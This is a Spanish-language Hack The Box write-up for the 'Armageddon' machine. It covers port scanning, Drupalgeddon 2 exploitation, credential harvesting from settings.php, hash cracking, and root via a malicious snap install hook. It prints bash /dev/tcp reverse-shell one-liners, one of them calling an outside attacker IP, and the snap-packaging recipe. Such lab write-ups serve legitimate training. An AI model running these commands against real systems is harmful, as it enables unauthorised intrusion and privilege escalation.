---
title: "Armageddon - Hack The Box"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/armageddon/data/armageddon.png?raw=true"
  teaser_home_page: true
  icon: "https://github.com/Wiinsad/Wiinsad.github.io/blob/master/assets/images/icons/Hackthebox2.png?raw=true"
categories:
  - Writeup
  - HackTheBox
tags:
  - Drupalgeddon
  - John
  - Snap
  - Linux
---

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/data/armageddonHTB.png">
</p>

La máquina **Armageddon** es una máquina virtual vulnerable de la plataforma HackTheBox con un nivel de dificultad **fácil** una puntuación de 3.7, **9388 USER OWNS** y **7996 SYSTEM OWNS** con la ip **10.10.10.233** y un sistema operativo **Linux**.

## Port Scan

Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.10.233]** utilizando los parámetros:
  - **-p-:**    Escaneo a toda la gama de puertos (65536).
  - **-n:**     No hacen la resolución del DNS.
  - **-T5:**    El parámetro más agresivo y ruidoso pero más rápido para hacer una exploración rápida.
  - **-v:**     Aumenta el nivel de los mensajes verbose.
  - **--open:** Muestra sólo los puertos con un estatus abierto.
  - **-oG:**    Guarda la el output en formato Grepeable.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/scan/ScanPort.png">
  </p>

  Una vez que hicimos el escaneo de puertos con la herramienta **ExtractPort**, vemos que los puertos que destacaron en este caso fueron **22,80**:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/scan/Ports.png">
  </p>

  Una vez identificados los puertos abiertos, realizaremos un escaneo de versiones y servicios de estos puertos con la herramienta nmap configurando los siguientes parámetros:

  - **-sC:** Script de enumeración básica de sondeo en puertos y servicios alojados.
  - **-sV:** Detección de versiones en servicios alojados en puertos.
  - **-p :** Puertos a inspeccionar.
  - **-oN:** Formatos de Nmap en los que se guardará el archivo.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/scan/PortServ.png">
  </p>

  Lo que podemos ver de esté escaneo de versiones y servicios es que esta maquina cuenta en el puerto **22** un servicio **ssh** y en el puerto **80** cuenta con un servicio web **http** el cual es gestionado por **apache**, también podemos ver que nmap nos muestra varias rutas que son potencialmente interesantes para examinar pero primero vamos a ver la web entrando por una via normal.

  Al entrar por via web podemos ver que la pagina nos muestra un login, si hacemos pruebas como ingresar credenciales típicas no tenemos ningún resultado al igual si agregamos una comilla para ver si podemos encontrar algún error de syntax de sql.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/scan/web.png">
  </p>

  Nmap nos indico que existe un recurso **Robots.txt** disponibles, si entramos a este recurso podemos ver una gran cantidad de rutas a las cuales podemos acceder, habiendo una muy interesante como **/CHANGELOG.txt** en la cual si entramos podemos ver que el servicio web tiene un gestor de contenido **Drupal 7** específicamente una version **7.56**, esta version es vulnerable a **Drupalgeddon 2.0.** ([más información](https://blog.sarenet.es/drupalgeddon/)).

  Hay una gran cantidad de exploits para explotar esta vulnerabilidad yo usare el exploit desarrollado por [pimps](https://github.com/pimps/CVE-2018-7600) pero puedes encontrar muchos mas buscando con el CVE: **CVE-2018-7600**.

## Gaining Access

  Ingresando los parámetros que marca la herramienta puedo ver que efectivamente el aplicativo es vulnerable a **Drupalgeddon 2.0.**.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/scan/drup.png">
  </p>

  Con esto entendido me entablare una revershell para poder acceder a la maquina ingresando el siguiente one line y poniéndome en escucha con **netcat**:

  ```bash
  bash -i >& /dev/tcp/[Your IP]/[Port] 0>&1
  ```
  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/intrusion/shell.png">
  </p>

## Privilege escalation - brucetherealadmin

  Ya dentro de la maquina y haciendo enumeración podemos llegar a un archivo en la ruta **/var/www/html/sites/default/settings.php** el cual tiene unas credenciales de la base de datos de mysql.

  Ya que no estamos en una **tty** podemos usar la herramienta de **mysql** con el parámetro **-e** el cual es para hacer consultas sin entrar en modo interactivo en mysql.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/intrusion/cred.png">
  </p>

  Enumerando la base de datos drupal podemos ver que hay una tabla llamada **"users"** la cual contiene un hash del usuario **brucetherealadmin** el cual es un usuario a nivel de sistema.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/intrusion/cred2.png">
  </p>

  Con este hash y usando la herramienta de john se puede aplicar fuerza bruta para descubrir el hash, haciendo esto podemos ver que el hash pertenece a la contraseña booboo:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/intrusion/hash.png">
  </p>


  Teniendo esto y recordando que el puerto **22** esta abierto podemos intentar usar estas credenciales para acceder por ssh.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/intrusion/ssh.png">
  </p>


## Privilege escalation - Root

  Ya que estamos dentro de la maquina por ssh y tenemos unas credenciales validas podemos enumerar el sistema con mas facilidad para ver hacer una escalada de privilegios hacia el usuario **root**.


  Enumerando el sistema y aplicando el comando **sudo -l** para listar los permisos a nivel sudo que tiene el usuario **brucetherealadmin** podemos ver que cuenta con la capacidad de ejecutar snap como root sin proporcionar contraseña.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/intrusion/sudo.png">
  </p>

  Con este permiso si buscamos en la herramienta [**gtfobins**](https://gtfobins.github.io/gtfobins/snap/#sudo) este recurso podemos ver que hay una forma de escalar privilegios

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/intrusion/gto.png">
  </p>


  Para probar esto en mi equipo me creo un el binario con las instrucciones que da **gtobins** el cual ejecutara un "whoami" y si la respuesta es **root** significa que funciona y tenemos una via segura para escalar privilegios.

  Para esto me cree el binario y levante un servicio **http** con python para poder pasar el binario a la maquina victima.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/intrusion/1.png">
  </p>

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/intrusion/2.png">
  </p>

  Como vemos comprobando com **md5sum** los archivos tienen el mismo hash lo que significa que se transfirió con éxito y sin ninguna alteración.

  Al ejecutar el binario con el install podemos ver que efectivamente tenemos ejecución de comando por parte de **root**

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/intrusion/3.png">
  </p>

  Excelente ahora que tenemos ejecución de comando como **root** vamos a subir un nuevo binario para hacer una jugada nueva, muchos usan el recurso de **"[dirty_sock](https://www.exploit-db.com/exploits/46361)"** el cual consiste en subir el binario **.snap** y te crea un usuario a nivel de sistema que pertenece al grupo **root**.

  Yo hare diferente la escalada, en el directorio personal de **brucetherealadmin** me creare una carpeta nueva **/home/brucetherealadmin/bin** en este directorio creare un binario llamado **winsad** ( ```touch winsad``` ) el cual tendrá el siguiente contenido:

  ```bash
  #!/bin/bash

  bash -i >& /dev/tcp/10.10.15.125/444 0>&1
  ```

  Le asigno permisos de ejecución con ```chmod +x winsad```, ahora con los pasos que se ven en **gtobins** compilare el binario con los siguientes argumentos en mi equipo:

  ```bash
COMMAND=/home/brucetherealadmin/bin/winsad
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
  ```

  Lo que estoy haciendo aquí es crear un binario **.snap** el cual apunte a mi binario y como es un contenido en bash lo va a interpretar, esto lo hago así ya que haciendo pruebas es la manera mas eficiente para evitar errores a la hora de crear el binario, así solo apunto a uno ya existente y que interprete el contenido del mismo.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/intrusion/preroot.png">
  </p>

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/armageddon/intrusion/root.png">
  </p>

  Como vemos nos interpreta el contenido del binario winsad y nos da la shell como el usuario **root**
